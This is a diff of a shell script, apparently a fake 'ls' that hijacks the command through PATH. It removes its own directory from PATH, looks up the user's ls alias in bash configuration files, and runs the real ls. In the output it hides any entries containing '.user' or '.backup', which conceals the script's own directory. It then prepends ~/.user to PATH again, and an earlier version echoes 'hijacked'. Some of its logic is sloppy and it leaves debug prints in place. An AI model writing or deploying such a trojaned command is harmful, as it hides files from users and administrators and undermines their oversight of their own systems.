@@ -1,14 +1,83 @@
 #!/bin/sh
 
-echo "hijacked"
-echo "updating path"
+# echo "hijacked"
+startsWith() {
+	echo "$2" | grep --color "^$1"
+}
+
+# grabbing the value from val, if possible
+checkVal() {
+	cmd=""
+	val="`echo $1 | cut -d'=' -f2-`"
+	if ! [ -z "$val" ]; then
+		# see if alias starts with a quote
+		if [ -z "`startsWith \' "$val"`" ] || [ "`startsWith \\\" "$val"`" ] || [ "`startsWith \\\` "$val"`" ]; then
+			# remove quotes
+			cmd="`echo $val | cut -c2- | rev | cut -c2- | rev`"
+		fi
+	fi
+	echo "$cmd"
+}
+
+# get the actual command name
+getCommandName() {
+	# see if there is a bash_aliases file
+	cmd="ls"
+	
+	val="`grep "alias ls" "$HOME/.bash_aliases" 2> /dev/null`"
+	ret="`checkVal "$val"`"
+	if ! [ -z "$ret" ]; then
+		echo "$ret"
+		return
+	fi
+
+	val="`grep "alias ls" "$HOME/.bashrc" 2> /dev/null`"
+	ret="`checkVal "$val"`"
+	if ! [ -z "$ret" ]; then
+		echo "$ret"
+		return
+	fi
+
+	val="`grep "alias ls" "/etc/bash.bashrc" 2> /dev/null`"
+	ret="`checkVal "$val"`"
+	if ! [ -z "$ret" ]; then
+		echo "$ret"
+		return
+	fi
+
+	echo "$cmd"
+}
+
+cmd="`getCommandName`"
+echo $cmd
+
+# Update path to normal
 export PATH=`echo $PATH | sed -e s/^[^:]*://`
-echo "$PATH"
-ls
 
-ls
+#echo "still here"
+# if [ "$#" -ne 0 ]; 
+# then
+# 	echo "$@"
+# 	color=$1;
+# 	shift;
+# fi
 
-echo "restoring path"
+if [ -z "$@" ]
+then
+	# Single lined ls
+	echo "single lined"
+
+	$cmd
+else
+	echo "not.";
+	if echo "$@" | grep "\-[^ ]*l";
+	then
+		echo "Aight"
+		$cmd $@ | grep -v ".user" | grep -v ".backup"
+	else
+		$cmd $@ | sed -z "s/ ?.user//"
+	fi
+	#echo "${array[@]}" =~ "-.*l"
+fi
+
 export PATH=~/.user/$PATH
-
-echo "$PATH"
